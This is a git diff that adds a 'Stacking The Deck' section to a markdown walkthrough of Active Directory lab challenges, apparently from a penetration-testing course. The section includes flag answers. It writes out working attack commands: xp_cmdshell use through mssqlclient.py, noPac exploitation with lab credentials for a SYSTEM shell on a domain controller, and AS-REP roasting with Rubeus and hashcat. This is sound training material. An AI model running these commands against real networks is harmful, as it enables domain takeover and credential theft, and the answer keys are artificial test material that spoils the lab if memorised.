@@ -25,6 +25,10 @@
     2. [ACL Enumeration](#acl-enumeration)
     3. [ACL Abuse Tactics](#acl-abuse-tactics)
     4. [DCSync](#dcsync)
+8. [Stacking The Deck](#stacking-the-deck)
+    1. [Privileged Access](#privileged-access)
+    2. [Bleeding Edge Vulnerabilities](#bleeding-edge-vulnerabilities)
+    3. [Miscellaneous Misconfigurations](#miscellaneous-misconfigurations)
 
 ## Initial Enumeration
 ### External Recon and Enumeration Principles
@@ -467,3 +471,139 @@
     ![alt text](Assets/DCSync2.png)
 
     The answer is `4bb3b317845f0954200a6b0acc9b9f9a`.
+
+## Stacking The Deck
+### Privileged Access
+#### Challenges
+1. What other user in the domain has CanPSRemote rights to a host?
+
+    We can solve this by using `bloodhound`. After upload the zip file into `bloodhound`, we can use this query.
+
+    ```neo4j
+    MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+    ```
+    ![alt text](Assets/PrivilegedAccess1.png)
+
+    The answer is `BDAVIS`.
+
+2. What host can this user access via WinRM? (just the computer name)
+
+    Based on the previous image, the answer is `ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`.
+
+3. Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt.
+
+    To solve this, we can use linux attack host and use `mssqlclient.py`.
+
+    ```bash
+    mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+    ```
+    Then in the sql session, we can run this.
+
+    ```sql
+    SQL> enable_xp_cmdshell
+    SQL> RECONFIGURE
+    SQL> xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
+    ```
+    The answer is `1m_the_sQl_@dm1n_n0w!`.
+
+### Bleeding Edge Vulnerabilities
+#### Tools
+1. noPac
+2. cube0x0/impacket
+3. PetitPotam.py
+#### Technique
+Here the 3 techniques analogy from the gemini.
+1. NoPac (SamAccountName Spoofing)
+
+![alt text](Assets/noPac-Analogy.png)
+
+2. PrintNightmare
+
+![alt text](Assets/printNightmare-Analogy.png)
+
+3. PetitPotam
+
+![alt text](Assets/petiPotam-Analogy.png)
+
+#### Challenges
+1. Which two CVEs indicate NoPac.py may work? (Format: ####-#####&####-#####, no spaces)
+    
+    The answer is `2021-42278&2021-42287`.
+
+2. Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop.
+
+    We can solve this by using `NoPac`. Firs we need to ensure if its vulnerable or not by using scanner.py from nopac.
+
+    ```bash
+    sudo python3 /opt/noPac/scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
+    ```
+
+    ![alt text](<Assets/Bleeding Edge Vulnerabilities1.png>)
+
+    We can see that the scanner successfully authenticated to the Domain Controller and was able to get Kerberos tickets. Now we can use `noPac.py` to perform the exploit.
+
+    ```bash
+    sudo python3 /opt/noPac/noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+    ```
+    If it is successful, we will get shell session with system authority. The answer is `D0ntSl@ckonN0P@c!`.
+
+### Miscellaneous Misconfigurations
+#### Tools
+1. PowerView.ps1
+2. rubeus.exe
+#### Technique
+Here the 5 techniques analogy from the gemini.
+1. Exchange & PrivExchange
+
+![alt text](<Assets/Exchange & PrivExchange - Analogy.png>)
+
+2. Printer Bug
+
+![alt text](<Assets/Printer Bug - Analogy.png>)
+
+3. Passwords on Post-it Notes
+
+![alt text](<Assets/Passwords on Post-it Notes - Analogy.png>)
+
+4. ASREPRoasting
+
+![alt text](<Assets/ASREPRoasting - Analogy.png>)
+
+5. GPO Abuse
+
+![alt text](<Assets/GPO Abuse - Analogy.png>)
+
+#### Challenges
+1. Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y".
+
+    passwd_notreqd means that the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). To solve this, we can use `PowerView.ps1`.
+
+    ```powershell
+    Import-Module C:\Tools\PowerView.ps1
+    Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+    ```
+
+    The answer is `ygroce`.
+
+2. Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer.
+
+    If "Do not require Kerberos pre-authentication setting" enabled, attacker can crack AS-REP hash that hashed with that user password. And we can get that user password. We can solve this by using `PowerView.ps1` again. First we need to find user that  have "Do not require Kerberos pre-authentication setting" enabled.
+
+    ```powershell
+    Import-Module C:\Tools\PowerView.ps1
+    Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+    ```
+    ![alt text](<Assets/Miscellaneous Misconfigurations1.png>)
+
+    It leads us to `ygroce` again. Then we can use `rubeus.exe` to perfrom ASREPRoasting to get the hash.
+
+    ```powershell
+    C:\Tools\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
+    ```
+
+    After we get the hash, we can crack it by using `hashcat` with mode `18200`.
+
+    ```bash
+    hashcat -m 18200 crack /usr/share/wordlists/rockyou.txt
+    ```
+    The answer is `Pass@word`.
